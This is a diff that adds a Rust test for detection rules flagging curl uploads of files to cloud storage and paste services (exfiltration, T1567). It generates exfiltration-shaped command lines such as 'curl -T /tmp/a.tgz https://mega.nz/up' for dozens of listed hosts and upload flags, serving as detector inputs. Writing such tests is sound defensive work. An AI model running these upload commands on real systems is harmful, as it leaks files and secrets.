@@ -233,6 +233,105 @@ fn a_samples_file_with_an_unknown_field_or_a_missing_half_is_refused() {
     assert!(load_samples(&rule).is_ok());
 }
 
+/// The storage and paste rules' domain lists and upload shapes (#380, T1567): the samples file holds
+/// one pair per rule, which cannot show every listed name or shape. Each row is a command line
+/// and the rule file it must (or must not) raise.
+#[test]
+fn the_storage_and_paste_rules_cover_each_listed_domain_and_upload_shape() {
+    let engine = SigmaEngine::load_dir(&content_dir()).unwrap();
+    let storage = "Linux curl uploads a file to a cloud storage endpoint";
+    let paste = "Linux curl uploads a file to a paste service";
+    let fires = |title: &str, cmdline: &str| {
+        let event = ExecEvent {
+            image_path: "/usr/bin/curl".to_string(),
+            cmdline: cmdline.to_string(),
+            ..schema::fixtures::exec()
+        };
+        engine.eval_exec(&event).iter().any(|a| a.title == title)
+    };
+    for host in [
+        "drive.google.com",
+        "storage.googleapis.com",
+        "content.dropboxapi.com",
+        "www.dropbox.com",
+        "dl.dropboxusercontent.com",
+        "acct.blob.core.windows.net",
+        "acme.sharepoint.com",
+        "onedrive.live.com",
+        "1drv.ms",
+        "upload.box.com",
+        "box.com",
+        "mega.nz",
+        "wetransfer.com",
+        "transfer.sh",
+        "file.io",
+        "gofile.io",
+        "anonfiles.com",
+        "catbox.moe",
+        "0x0.st",
+        "bucket.s3.amazonaws.com",
+    ] {
+        assert!(
+            fires(storage, &format!("curl -T /tmp/a.tgz https://{host}/up")),
+            "{host}"
+        );
+        assert!(
+            !fires(paste, &format!("curl -T /tmp/a.tgz https://{host}/up")),
+            "{host}"
+        );
+    }
+    for host in [
+        "pastebin.com",
+        "paste.ee",
+        "hastebin.com",
+        "rentry.co",
+        "controlc.com",
+        "dpaste.com",
+        "dpaste.org",
+        "ix.io",
+        "termbin.com",
+        "justpaste.it",
+        "privatebin.net",
+    ] {
+        assert!(
+            fires(paste, &format!("curl -T /tmp/a.txt https://{host}/up")),
+            "{host}"
+        );
+        assert!(
+            !fires(storage, &format!("curl -T /tmp/a.txt https://{host}/up")),
+            "{host}"
+        );
+    }
+    for shape in [
+        "--upload-file /tmp/a",
+        "-T /tmp/a",
+        "-F file=@/tmp/a",
+        "--form file=@/tmp/a",
+        "-d @/tmp/a",
+        "--data @/tmp/a",
+        "--data-binary @/tmp/a",
+    ] {
+        assert!(
+            fires(storage, &format!("curl {shape} https://mega.nz/up")),
+            "{shape}"
+        );
+        assert!(
+            fires(paste, &format!("curl {shape} https://pastebin.com/up")),
+            "{shape}"
+        );
+    }
+    // A host that merely contains a listed name as a substring, and a request without an upload.
+    for cmdline in [
+        "curl -T /tmp/a https://sandbox.com/up",
+        "curl -T /tmp/a https://profile.io/up",
+        "curl -s https://mega.nz/file/abc",
+        "curl -d name=x https://mega.nz/api",
+    ] {
+        assert!(!fires(storage, cmdline), "{cmdline}");
+    }
+    assert!(!fires(paste, "curl -d name=x https://pastebin.com/api"));
+}
+
 #[test]
 fn the_local_and_remote_shell_service_rules_split_on_the_unc_argument() {
     const LOCAL: &str = "Service created with a command-shell binary path";
